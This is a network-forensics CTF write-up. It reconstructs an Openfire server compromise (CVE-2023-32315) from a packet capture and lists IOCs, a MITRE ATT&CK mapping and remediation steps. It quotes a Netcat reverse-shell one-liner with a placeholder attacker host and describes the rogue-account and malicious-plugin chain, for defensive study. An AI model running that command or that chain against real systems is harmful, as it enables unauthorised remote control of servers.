# OpenFire - Network Forensics (PCAP)

**Environment:** CyberDefenders (Blue Team CTF) | **Category:** Network Forensics | **Date completed:** 2026-09-08
**Tags:** `network-forensics` `pcap` `wireshark` `cve-2023-32315` `openfire` `mitre-attack`

> Educational lab exercise from CyberDefenders. Challenge-specific answer values (tokens, credentials, created usernames, host addresses) are redacted or masked in line with the platform's terms. The focus of this write-up is the PCAP analysis methodology.

---

## Scenario & objective

A packet capture from a compromised Openfire messaging server. The goal was to reconstruct the intrusion end to end from network traffic alone: the initial admin login, unauthorised account creation, a malicious plugin upload, remote command execution, and the reverse shell, then identify the exploited vulnerability. A pure network-forensics exercise, worked entirely in Wireshark.

## Environment & data sources

- A single PCAP covering the Openfire admin-console traffic and the attacker's reverse-shell session
- Traffic was unencrypted HTTP, so credentials, tokens, and commands were visible in the clear

## Tools used

- Wireshark: display filters, chronological sorting, and HTTP/TCP stream following

## Investigation & methodology

My approach was filter-driven and worked in the order the evidence appeared, so "first" and "last" events could be read straight off a time-sorted list.

1. **Set the timeline.** Loaded the PCAP, applied an `http` filter, and sorted the time column in ascending order. With events in strict order, the "first login" and "first account created" style questions became a matter of reading top-down.

2. **First login (CSRF token and password).** Focused on the login POST requests and opened the first one. Because the traffic was cleartext, that single request body held the submitted username, password, and CSRF token together, so one packet answered both the token and the password questions.

3. **First account the attacker created.** Filtered the request URIs for user activity (`http.request.uri contains "user"`) and picked out the `user-create.jsp` requests. Their parameters carried the new username, password, and an admin flag; the earliest `user-create.jsp` was the first account created.

4. **Admin-panel login.** Went back to the login POSTs and read the last `login.jsp` request. The attacker authenticated with one of the accounts created earlier, confirming a rogue admin account used to hold access.

5. **Malicious plugin upload.** Staying on the POST view, a request to `plugin-admin.jsp` stood out purely by size, roughly 2,572 bytes against the few-hundred-byte logins. That length anomaly was the tell. Following its HTTP stream confirmed a multipart JAR plugin upload.

6. **First command executed.** Filtered URIs containing `cmd` (`http.request.uri contains "cmd"`) to surface the plugin's `cmd.jsp` endpoint, then inspected the first request's payload. The opening command was `whoami`, the usual privilege check.

7. **Reverse shell.** In the same `cmd.jsp` traffic, one request carried a Netcat reverse shell back to the attacker's host (`nc <attacker-ip> <port> -e /bin/bash`), a classic `nc` one-liner.

8. **Follow-on recon and root cause.** Following the TCP stream of that shell session exposed the interactive commands that came next, including a network-interface check (`ifconfig`). The overall chain, an unauthenticated route into the console followed by a plugin upload leading to RCE, matched CVE-2023-32315.

## Key findings

The full intrusion, reconstructed from the PCAP:

- **Initial access:** exploitation of the Openfire admin console via CVE-2023-32315 (unauthenticated path traversal / auth bypass)
- **Persistence:** rogue admin accounts created through `user-create.jsp`, plus a malicious JAR plugin exposing a command endpoint
- **Execution:** commands issued through the plugin's `cmd.jsp`, starting with `whoami`
- **Command & Control:** a Netcat reverse shell to the attacker's host
- **Discovery:** `ifconfig` over the shell to enumerate network interfaces

## Indicators of compromise (IOCs)

*Answer-specific values masked in line with platform terms.*

| Type | Indicator | Notes |
|---|---|---|
| Web | POST `/plugin-admin.jsp` (~2.5 KB) | Oversized request, the malicious JAR plugin upload |
| Web | `plugins/openfire-plugin/cmd.jsp` | Command endpoint exposed by the plugin |
| Account | `<redacted>` (rogue admin accounts) | Created via `user-create.jsp` |
| Network | `<attacker-ip>:<port>` | Netcat reverse-shell destination |
| Vuln | CVE-2023-32315 | Openfire console path traversal, plugin upload to RCE |

## MITRE ATT&CK mapping

| Tactic | Technique | Observed as |
|---|---|---|
| Initial Access | T1190 Exploit Public-Facing Application | CVE-2023-32315 against the Openfire console |
| Persistence | T1136 Create Account / T1505.003 Web Shell | Rogue admin accounts and malicious JAR plugin |
| Execution | T1059 Command & Scripting Interpreter | Commands via `cmd.jsp` |
| Command & Control | T1571 / reverse shell | Netcat `-e /bin/bash` callback |
| Discovery | T1033 / T1016 | `whoami`, `ifconfig` |

## Remediation & recommendations

- **Immediate:** patch Openfire to a fixed release for CVE-2023-32315; remove the malicious plugin and rogue accounts; kill the shell session and block the attacker host
- **Containment:** rotate all admin credentials; audit the plugin directory and console access logs for other changes
- **Preventive:** keep the admin console off the public network (segmentation or VPN-only); enforce TLS so console traffic is not cleartext; alert on plugin uploads and on outbound connections from the server to unexpected hosts or ports

## Lessons learned

- **Anomalies live in metadata, not just payloads.** The plugin upload was easiest to find by packet size, not by reading content. Request length, timing, and frequency are first-class indicators in network forensics.
- **Cleartext is the analyst's gift and the defender's failure.** Everything was readable because the console ran over plain HTTP, and that same fact is itself a finding worth reporting.
- **Order before answers.** Sorting chronologically before touching any single question prevented "first vs last" mix-ups and made every step that followed reliable.
- **Switch views, not just filters.** Finding the requests needed the HTTP view; reading the interactive shell needed the TCP-stream view. Knowing when to change lens mattered as much as the filters.
